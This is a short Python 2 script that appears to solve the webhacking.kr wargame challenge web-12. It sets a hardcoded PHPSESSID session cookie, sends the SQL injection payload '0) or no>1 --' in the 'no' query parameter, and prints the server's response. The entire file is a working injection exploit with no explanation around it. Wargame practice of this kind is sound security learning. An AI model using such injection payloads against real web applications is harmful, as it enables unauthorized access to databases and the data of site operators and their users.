#-*- coding: utf-8 -*-
import urllib
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-12/"
sessionId = "e28ad7cb81a98a13982054373940bf92"

CookieManager.addCookie("PHPSESSID", sessionId)

parameter = urllib.quote("0) or no>1 --")
httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
